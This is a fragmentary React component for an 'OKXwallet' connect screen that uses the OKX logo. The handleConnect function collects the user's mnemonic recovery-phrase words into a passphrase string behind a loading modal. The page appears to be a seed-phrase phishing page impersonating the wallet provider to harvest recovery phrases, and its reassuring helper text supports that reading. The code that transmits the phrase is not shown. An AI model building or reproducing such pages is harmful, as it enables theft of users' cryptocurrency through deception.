...
import { Shield, Lock, KeyRound, EyeOff, Eye } from "lucide-react";
import logo from "../../assets/okex_dark.png";
...
const OKXwallet = () => {
  ...
  const handleConnect = () => {
    const currentPassphrase = mnemonic.filter(Boolean).join(", ");
    setLoading(true);
  ...
  return (
    <div className="min-h-screen bg-black text-gray-100 w-full mt-11">
      ...
      {loading && (
        <LoadingModal type={"OKXwallet"} onClose={() => setLoading(false)} />
      )}
        ...
        <div className="grid md:grid-cols-2 gap-8">
          ...
          <div className=" p-6">
            <div className="mb-6">
              <div className="flex items-center gap-3 mb-6">
                ...
                <h2 className="text-2xl font-semibold">OKXwallet</h2>
              </div>
            ...
            <div className="space-y-6">
              ...
              <div>
                ...
                <p className="text-sm text-gray-500 mt-1 italic">
                  Optional: Used for enhanced connection security
                </p>
              </div>
          ...
          {/* <div className="bg-black rounded-lg p-6">
            ...
            <ol className="space-y-4">
              {[
                "Log in to your OKXwallet account",
